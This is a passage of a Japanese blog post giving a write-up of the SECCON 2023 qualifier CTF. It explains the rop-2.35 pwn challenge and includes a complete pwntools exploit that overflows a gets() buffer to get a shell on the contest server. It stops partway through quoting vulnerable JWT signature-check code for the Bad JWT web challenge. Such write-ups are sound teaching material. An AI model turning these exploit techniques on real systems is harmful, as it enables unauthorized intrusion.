<!DOCTYPE html>
<html lang="ja">
  <head>
    
    <script type="application/ld+json">

{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SECCON 2023 Quals Writeup",
  
  "image": "https://f2l.cc/2023/09/seccon-2023-quals-writeup/cert.jpg",
  
  "datePublished": "2023-09-18T14:02:32+09:00",
  "dateModified": "2023-09-18T14:02:32+09:00",
  "author": {
    "@type": "Person",
    "name": "Kazutoshi Noguchi",
    
    "image": "https://f2l.cc/insignia.png"
    
  },
  "mainEntityOfPage": { 
    "@type": "WebPage",
    "@id": "https:\/\/f2l.cc\/2023\/09\/seccon-2023-quals-writeup\/" 
  },
  "publisher": {
    "@type": "Organization",
    "name": "FÂ²L",
    
    "logo": {
      "@type": "ImageObject",
      "url": "https://f2l.cc/insignia.png"
    }
    
  },
  "description": "2023-09-16 ã€œ 17 ã«ã‹ã‘ã¦é–‹å‚¬ã•ã‚ŒãŸ SECCON 2023 äºˆé¸ã«å‚åŠ ã—ã¾ã—ãŸã€‚ çµæœã¯å…¨ä½“ 58ä½, å›½å†…19ä½ã§ã—ãŸã€‚",
  "keywords": []
}

</script>

    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="generator" content="Hugo 0.136.5 with theme Tranquilpeak 0.5.3-BETA">
<meta name="author" content="Kazutoshi Noguchi">
<meta name="keywords" content="">
<meta name="description" content="2023-09-16 ã€œ 17 ã«ã‹ã‘ã¦é–‹å‚¬ã•ã‚ŒãŸ SECCON 2023 äºˆé¸ã«å‚åŠ ã—ã¾ã—ãŸã€‚
çµæœã¯å…¨ä½“ 58ä½, å›½å†…19ä½ã§ã—ãŸã€‚">


<meta property="og:description" content="2023-09-16 ã€œ 17 ã«ã‹ã‘ã¦é–‹å‚¬ã•ã‚ŒãŸ SECCON 2023 äºˆé¸ã«å‚åŠ ã—ã¾ã—ãŸã€‚
çµæœã¯å…¨ä½“ 58ä½, å›½å†…19ä½ã§ã—ãŸã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="SECCON 2023 Quals Writeup">
<meta name="twitter:title" content="SECCON 2023 Quals Writeup">
<meta property="og:url" content="https://f2l.cc/2023/09/seccon-2023-quals-writeup/">
<meta property="twitter:url" content="https://f2l.cc/2023/09/seccon-2023-quals-writeup/">
<meta property="og:site_name" content="FÂ²L">
<meta property="og:description" content="2023-09-16 ã€œ 17 ã«ã‹ã‘ã¦é–‹å‚¬ã•ã‚ŒãŸ SECCON 2023 äºˆé¸ã«å‚åŠ ã—ã¾ã—ãŸã€‚
çµæœã¯å…¨ä½“ 58ä½, å›½å†…19ä½ã§ã—ãŸã€‚">
<meta name="twitter:description" content="2023-09-16 ã€œ 17 ã«ã‹ã‘ã¦é–‹å‚¬ã•ã‚ŒãŸ SECCON 2023 äºˆé¸ã«å‚åŠ ã—ã¾ã—ãŸã€‚
çµæœã¯å…¨ä½“ 58ä½, å›½å†…19ä½ã§ã—ãŸã€‚">
<meta property="og:locale" content="ja">

  
    <meta property="article:published_time" content="2023-09-18T14:02:32">
  
  
    <meta property="article:modified_time" content="2023-09-18T14:02:32">
  
  
  
    
      <meta property="article:section" content="CTF">
    
      <meta property="article:section" content="writeup">
    
  
  
    
      <meta property="article:tag" content="SECCON">
    
  


<meta name="twitter:card" content="summary">

  <meta name="twitter:site" content="@n_g_k_z">


  <meta name="twitter:creator" content="@n_g_k_z">






  <meta property="og:image" content="https://f2l.cc/insignia.png">
  <meta property="twitter:image" content="https://f2l.cc/insignia.png">





  <meta property="og:image" content="https://f2l.cc/2023/09/seccon-2023-quals-writeup/cert.jpg">
  <meta property="twitter:image" content="https://f2l.cc/2023/09/seccon-2023-quals-writeup/cert.jpg">


    <title>SECCON 2023 Quals Writeup</title>

    <link rel="icon" href="https://f2l.cc/favicon.ico">
    

    

    <link rel="canonical" href="https://f2l.cc/2023/09/seccon-2023-quals-writeup/">

    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    
    
    
    <link rel="stylesheet" href="https://f2l.cc/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
    
    

    
    
  </head>

  <body>
    <div id="blog">
      <header id="header" data-behavior="1">
  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
  <div class="header-title">
    <a class="header-title-link" href="https://f2l.cc/" aria-label="ãƒ›ãƒ¼ãƒ ãƒšãƒ¼ã‚¸ã¸">FÂ²L</a>
  </div>
  
    
      <a class="header-right-picture "
         href="https://f2l.cc/page/profile/" aria-label="ãƒªãƒ³ã‚¯ã‚’é–‹ã: /page/profile/">
    
    
    
      
        <img class="header-picture" src="https://f2l.cc/insignia.png" alt="ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ç”»åƒ" />
      
    
    </a>
  
</header>

      <nav id="sidebar" data-behavior="1">
  <div class="sidebar-container">
    
      <div class="sidebar-profile">
        <a href="https://f2l.cc/page/profile/" aria-label="è‘—è€…ã«ã¤ã„ã¦ã‚‚ã£ã¨èª­ã‚€">
          <img class="sidebar-profile-picture" src="https://f2l.cc/insignia.png" alt="ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ç”»åƒ" />
        </a>
        <h4 class="sidebar-profile-name">Kazutoshi Noguchi</h4>
        
          <h5 class="sidebar-profile-bio">ğŸˆğŸ§‘â€ğŸ’»ğŸš©ğŸ§â„ï¸âš¡ğŸšğŸ”§ğŸ’…ğŸ‘˜â¤ï¸ğŸ’œğŸ’™ğŸ¤</h5>
        
      </div>
    
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://f2l.cc/" title="Home">
    
      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">ãƒ›ãƒ¼ãƒ </span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://f2l.cc/categories" title="Categories">
    
      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">ã‚«ãƒ†ã‚´ãƒªãƒ¼</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://f2l.cc/tags" title="Tags">
    
      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">ã‚¿ã‚°</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://f2l.cc/archives" title="Archives">
    
      <i class="sidebar-button-icon fas fa-lg fa-archive" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">ã‚¢ãƒ¼ã‚«ã‚¤ãƒ–</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://f2l.cc/page/profile/" title="About">
    
      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://github.com/ngkz" target="_blank" rel="noopener" title="GitHub">
    
      <i class="sidebar-button-icon fab fa-lg fa-github" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">GitHub</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://twitter.com/n_g_k_z" target="_blank" rel="noopener" title="Xitter">
    
      <i class="sidebar-button-icon fab fa-lg fa-twitter" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">Xitter</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://discord.com/users/529714068618215427" target="_blank" rel="noopener" title="Discord">
    
      <i class="sidebar-button-icon fab fa-lg fa-discord" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">Discord</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://f2l.cc/index.xml" title="RSS">
    
      <i class="sidebar-button-icon fas fa-lg fa-rss" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">RSS</span>
    </a>
  </li>


    </ul>
  </div>
</nav>

      

      <div id="main" data-behavior="1"
        class="
               hasCoverMetaIn
               ">
        <article class="post" id="top">
          
          
            <div class="post-header main-content-wrap text-left">
  
    <h1 class="post-title">
      SECCON 2023 Quals Writeup
    </h1>
  
  
  <div class="postShorten-meta post-meta">
    
      <time datetime="2023-09-18T14:02:32&#43;09:00">
        
  
  
  
  
    2023-09-18
  

      </time>
    
    
  
  
    <span>ã‚«ãƒ†ã‚´ãƒªãƒ¼</span>
    
      <a class="category-link" href="https://f2l.cc/categories/ctf">CTF</a>, 
    
      <a class="category-link" href="https://f2l.cc/categories/writeup">writeup</a>
    
  

  </div>

</div>
          
          <div class="post-content markdown">
            <div class="main-content-wrap">
              <p>2023-09-16 ã€œ 17 ã«ã‹ã‘ã¦é–‹å‚¬ã•ã‚ŒãŸ SECCON 2023 äºˆé¸ã«å‚åŠ ã—ã¾ã—ãŸã€‚
çµæœã¯å…¨ä½“ 58ä½, å›½å†…19ä½ã§ã—ãŸã€‚</p>



<div class="figure center nocaption" >
  
    <img class="fig-img" src="cert.jpg" style="width: 500px;height: 500px;" alt="Certificate of Participation, Term: 1y1, 832pt, Rank 58/653">
  
  
</div>

<h1 id="table-of-contents">ç›®æ¬¡</h1>
<nav id="TableOfContents">
  <ul>
    <li><a href="#7å¹´ã¶ã‚Šã«ctf">7å¹´ã¶ã‚Šã«CTF</a>
      <ul>
        <li><a href="#ctfã£ã¦ä½•ã™ã‹-çŸ¥ã‚‰ãªã„äººå‘ã‘">CTFã£ã¦ä½•ã™ã‹ (çŸ¥ã‚‰ãªã„äººå‘ã‘)</a></li>
      </ul>
    </li>
    <li><a href="#è§£ã„ãŸå•é¡Œ">è§£ã„ãŸå•é¡Œ</a>
      <ul>
        <li><a href="#welcome-welcome">Welcome (welcome)</a></li>
        <li><a href="#rop-235-pwning">rop-2.35 (pwning)</a></li>
        <li><a href="#bad-jwt-web">Bad JWT (web)</a></li>
        <li><a href="#readme-2023-misc">readme 2023 (misc)</a></li>
        <li><a href="#jumpout-reversing">jumpout (reversing)</a></li>
        <li><a href="#perfect-blu-reversing">Perfect Blu (reversing)</a></li>
        <li><a href="#selfcet-pwning">selfcet (pwning)</a></li>
        <li><a href="#crabbox-misc">crabbox (misc)</a></li>
      </ul>
    </li>
    <li><a href="#ãŠã‚ã‚Š">ãŠã‚ã‚Š</a></li>
  </ul>
</nav>

<h2 id="7å¹´ã¶ã‚Šã«ctf">7å¹´ã¶ã‚Šã«CTF</h2>
<p><abbr title="å ´é¢ç·˜é»™ç—‡ãŒã‚ã‚Šã€æ›¸ãã®ã‚‚è‹¦æ‰‹ã§ã€ã—ã‹ã‚‚é¢æ¥ã¨è¨ºå¯ŸãŒä¸€ç•ªè‹¦æ‰‹ãªå ´é¢ãªã®ã§ã€äººç”ŸãŒã†ã¾ãã„ã‹ãªãã¦â€¦ å…¨ã¦ã«å«Œæ°—ãŒå·®ã—ã¦SNSãªã©ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰ä½•ã‹ã‚‰å…¨éƒ¨æ¶ˆã—ã¦2å¹´é–“ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã‹ã‚‰æ¶ˆãˆã¦ãŸã‚Šã€ãã®å¾Œã‚‚InfoSecã‹ã‚‰è·é›¢ã‚’å–ã£ãŸã‚Šã—ã¦ã„ã¾ã—ãŸã€‚å½“æ™‚ã®CTFãƒ—ãƒ¬ãƒ¼ãƒ¤ãƒ¼ãªã‚‰ç§ã®æ­£ä½“ã®å¯Ÿã—ãŒã¤ãã¨æ€ã„ã¾ã™ (OSINT 100)ã€‚ã”è¿·æƒ‘ã‚’ãŠã‹ã‘ã—ã¦ã‚‚ã†ã—ã‚ã‘ã‚ã‚Šã¾ã›ã‚“â€¦">äº‹æƒ…</abbr>ãŒã‚ã£ã¦CTFã‹ã‚‰ãšã£ã¨é›¢ã‚Œã¦ã„ãŸã®ã§ã™ãŒã€æœ€è¿‘å¿ƒå¢ƒã®å¤‰åŒ–ãŒã‚ã‚Šã€ä¹…ã—æŒ¯ã‚Šã«å‚æˆ¦ã—ã¾ã—ãŸã€‚æœ€å¾Œã®å‚åŠ ãŒ2016å¹´ãªã®ã§ã€7å¹´ã¶ã‚Šã§ã™ã­ã€‚<strong>7å¹´!?</strong></p>


 
  
  
  
  
    
      
    
  
    
  

<div class="figure center" >
  
    <a class="fancybox" href="result.jpg" title="SECCON 2012ãƒ»2013ã®å„ªå‹ãƒãƒ¼ãƒ ã®ãƒ¡ãƒ³ãƒãƒ¼ã¨ã¯æ€ãˆãªã„ã—ã‚‡ã†ã‚‚ãªã„æˆ¦ç¸¾" data-fancybox="">
  
    <img class="fig-img" src="result.jpg" style="width: 814px;" alt="SECCON 2012ãƒ»2013ã®å„ªå‹ãƒãƒ¼ãƒ ã®ãƒ¡ãƒ³ãƒãƒ¼ã¨ã¯æ€ãˆãªã„ã—ã‚‡ã†ã‚‚ãªã„æˆ¦ç¸¾">
  
    </a>
  
   
    <span class="caption">SECCON 2012ãƒ»2013ã®å„ªå‹ãƒãƒ¼ãƒ ã®ãƒ¡ãƒ³ãƒãƒ¼ã¨ã¯æ€ãˆãªã„ã—ã‚‡ã†ã‚‚ãªã„æˆ¦ç¸¾</span>
  
</div>

<p>7å¹´ã®ãƒ–ãƒ©ãƒ³ã‚¯ã§è…•ãŒå®Œå…¨ã«éŒ†ã³ã¤ã„ã¦ã„ã‚‹ä¸Šã«ã‚´ã‚¿ã‚´ã‚¿ã—ã¦ã¦äº‹å‰ã«ã»ã¨ã‚“ã©ç·´ç¿’ã§ããªã‹ã£ãŸã«ã‚‚ã‹ã‹ã‚ã‚‰ãšã€ç„¡è¬€ã«ã‚‚ã‚½ãƒ­ã§çªã£ã“ã‚“ã ã®ã§æŒ¯ã‚‹ã‚ãªã„æˆç¸¾ã§çµ‚ã‚ã£ã¦ã—ã¾ã„ã¾ã—ãŸã€‚å›½å†…ãƒãƒ¼ãƒ ã¯å›½å†…é †ä½10ä½ä»¥ä¸Šã§äºˆé¸é€šéã§ãã¾ã™ãŒã€å½“ç„¶é€šéã§ãã¾ã›ã‚“ã§ã—ãŸã€‚é›ãˆãªãŠã•ãªã„ã¨ã„ã‘ã¾ã›ã‚“ã­ã€‚<br>
ç‰¹ã«Cryptoã¯å…¨ããƒ€ãƒ¡ã§ã€å…ƒã€…nolzeãã‚“é ¼ã‚Šã§å¼±ã‹ã£ãŸã®ã«ã€ã•ã‚‰ã«æ•°å­¦ã‚‚RSAã‚‚å®Œå…¨ã«å¿˜ã‚Œã¦ã—ã¾ã£ãŸã®ã§warmupå•é¡Œã™ã‚‰è§£ã‘ã¾ã›ã‚“ã§ã—ãŸã€‚ç²¾é€²ã—ã¾ã™â€¦</p>
<h3 id="ctfã£ã¦ä½•ã™ã‹-çŸ¥ã‚‰ãªã„äººå‘ã‘">CTFã£ã¦ä½•ã™ã‹ (çŸ¥ã‚‰ãªã„äººå‘ã‘)</h3>
<p>ãƒãƒƒã‚­ãƒ³ã‚°ç«¶æŠ€ã§ã™ã€‚å‡ºé¡Œã•ã‚ŒãŸå•é¡Œã«æ”»æ’ƒã™ã‚‹ãªã‚Šè§£èª­ã™ã‚‹ãªã‚Šã—ã¦éš ã•ã‚ŒãŸãƒ•ãƒ©ã‚°ã¨å‘¼ã°ã‚Œã‚‹æ–‡å­—åˆ—ã‚’æ¢ã—ã ã™ã®ã§ã€<code>Capture The Flag</code> (ãƒ•ãƒ©ã‚°ã‚’ç²ã‚Œ)ã€ç•¥ã—ã¦CTFã¨å‘¼ã³ã¾ã™ã€‚ç²ã‚‰ãªã„ç«¶æŠ€å½¢å¼ã‚‚ã‚ã‚Šã¾ã™ãŒã€ãã‚Œã‚‚CTFã¨å‘¼ã³ã¾ã™ã€‚</p>
<p>CTFçŸ¥ã‚‰ãªã„äººã¯ã“ã®å…ˆã‚’èª­ã‚“ã§ã‚‚ã‚ˆãåˆ†ã‹ã‚‰ãªã„æ°—ãŒã™ã‚‹ã€‚</p>
<h2 id="è§£ã„ãŸå•é¡Œ">è§£ã„ãŸå•é¡Œ</h2>
<h3 id="welcome-welcome">Welcome (welcome)</h3>
<p>é€£çµ¡ç”¨ã®Discordã«è²¼ã£ã¦ã‚ã‚‹Flagã‚’å…¥åŠ›ã—ã¾ã™ã€‚å‚åŠ è€…ã‚’ç¢ºå®Ÿã«é€£çµ¡ç”¨ã‚µãƒ¼ãƒãƒ¼ã«èª˜å°ã™ã‚‹ã„ã„ã‚¢ã‚¤ãƒ‡ã‚¢ã§ã™ã­ã€‚</p>
<h3 id="rop-235-pwning">rop-2.35 (pwning)</h3>
<p>å•é¡Œ:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x10</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo Enter something:&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(buf);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>å•é¡ŒãŒReturn Oriented Programmingã§<code>system(&quot;/bin/sh&quot;)</code>ã—ã‚ã¨å«ã‚“ã§ã„ã¾ã™ã­ã€‚NX Enabledã§Stack Smashing Protctorãªã—ã§ã™ã€‚<br>
ä¸€è¦‹ã™ã‚‹ã¨ç°¡å˜ãªROPå•ã§ã€<a href="https://www.youtube.com/live/jwM5OP81cl0?feature=shared&amp;t=3976">å®Ÿéš›ç°¡å˜ãªROPå•ã§ã™</a>ã€‚æƒ³å®šè§£ã§ã¯ROP gadgetã™ã‚‰ä¸è¦ã§ã™ã€‚</p>
<p>ã—ã‹ã—ã€ãªãœã‹æ›¸ã„ãŸexploitãŒå®Ÿç’°å¢ƒã§å‹•ã‹ãªãã¦ã€ã€Œwarmupå•ãŒã“ã‚“ãªé›£ã—ã„ã¯ãšãŒãªã„ã€çµ¶å¯¾ã«ä½•ã‹ãŒãŠã‹ã—ã„ã€ã¨æ€ã„ã¤ã¤ç’°å¢ƒã«ä¾å­˜ã—ãªã„ç„¡é§„ã«è¤‡é›‘ãªãƒã‚§ãƒ¼ãƒ³ã«æ›¸ãç›´ã—ãŸã‚Šã—ã¦ãŸã‚‰2æ™‚é–“è¿‘ãã‚‚åµŒã¾ã£ã¦ã—ã¾ã„ã¾ã—ãŸã€‚ã“ã‚“ãªã®10åˆ†ã§ã§ããªã„ã¨ã„ã‘ãªã„ã§ã™ã‚ˆã€ãƒ˜ã‚¿ã‚¯ã‚½!</p>
<p>ã¨ã“ã‚ã§ã€FlagãŒ<code>SECCON{i_miss_you_libc_csu_init_:cry:}</code> ã ã£ãŸã®ã§ã™ãŒã€ã“ã‚Œã¯2018å¹´ã«ç¾ã‚ŒãŸ<code>return-to-csu</code>ã¨å‘¼ã°ã‚Œã‚‹ROPã®æ‰‹æ³•ã®ã“ã¨ã‚‰ã—ãã€ã©ã†ã‚„ã‚‰ç§ãŒå¼•é€€ã—ã¦ã„ãŸé–“ã«æ–°ã—ã„æ”»æ’ƒæ³•ãŒç¾ã‚Œã€ãã—ã¦å¯¾ç­–ã•ã‚Œã¦æ¶ˆãˆã¦ã„ã£ã¦ã„ãŸã¿ãŸã„ã§ã™ã€‚è«¸è¡Œç„¡å¸¸ã€‚<del>ã“ã®æ‰‹æ³•æ˜”ä½¿ã£ãŸã“ã¨ã‚ã‚‹ã‚ˆã†ãªâ€¦</del></p>
<p>è¿½è¨˜: <a href="https://inaz2.hatenablog.com/entry/2014/12/03/204939">æ˜”ã‹ã‚‰å­˜åœ¨ã—ãŸæ‰‹æ³•ã§ã—ãŸ</a>ã€‚ã©ã†ã‚Šã§è¦‹ãŸã“ã¨ãŒã‚ã‚‹ã‚ã‘ã‹</p>
<p>exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;rop-2-35.seccon.games&#34;</span>, <span style="color:#ae81ff">9999</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># r = process(&#34;./chall&#34;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># input()</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">24</span> <span style="color:#f92672">-</span> len(p))
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x40113d</span>) <span style="color:#75715e">#poprbp</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x404020</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#75715e">#rbp = gets@plt + 0x10</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x401171</span>) <span style="color:#75715e">#gets(rbp-0x10); rsp = rbp; pop rbp; ret</span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(buf)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x404020</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x401050</span>) <span style="color:#75715e">#gets@plt @ 0x404020 = system</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> len(buf))
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x404020</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#75715e">#new rbp</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> (p64(<span style="color:#ae81ff">0x401016</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">128</span> <span style="color:#75715e">#rsp += 8; ret</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x401171</span>) <span style="color:#75715e">#gets == system, gets(rbp-0x10)</span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(buf)
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h3 id="bad-jwt-web">Bad JWT (web)</h3>
<p>ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®<code>isAdmin</code>ãŒ<code>true</code>ã®JWTã‚’æ¸¡ã™ã¨Flagã‚’è¿”ã—ã¦ãã‚Œã‚‹webã‚µãƒ¼ãƒ“ã‚¹ã‚’æ”»ç•¥ã™ã‚‹å•é¡Œã§ã™ã€‚</p>
<p>JWTã®æ¤œè¨¼å‡¦ç†ã¯ã“ã†ãªã£ã¦ã„ã¾ã™:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// æŠœç²‹:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">algorithms</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">hs256</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">secret</span>) =&gt; 
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">base64UrlEncode</span>(<span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createHmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#a6e22e">secret</span>).<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">data</span>).<span style="color:#a6e22e">digest</span>()),
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">hs512</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">secret</span>) =&gt; 
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">base64UrlEncode</span>(<span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createHmac</span>(<span style="color:#e6db74">&#39;sha512&#39;</span>, <span style="color:#a6e22e">secret</span>).<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">data</span>).<span style="color:#a6e22e">digest</span>()),
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">stringifyPart</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">obj</span>) =&gt; {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">base64UrlEncode</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">obj</span>));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parsePart</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">str</span>) =&gt; {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">base64UrlDecode</span>(<span style="color:#a6e22e">str</span>));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">createSignature</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">header</span>, <span style="color:#a6e22e">payload</span>, <span style="color:#a6e22e">secret</span>) =&gt; {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">stringifyPart</span>(<span style="color:#a6e22e">header</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">stringifyPart</span>(<span style="color:#a6e22e">payload</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">signature</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">algorithms</span>[<span style="color:#a6e22e">header</span>.<span style="color:#a6e22e">alg</span>.<span style="color:#a6e22e">toLowerCase</span>()](<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">secret</span>); <span style="color:#75715e">// &lt;-- !!!!!!!!!
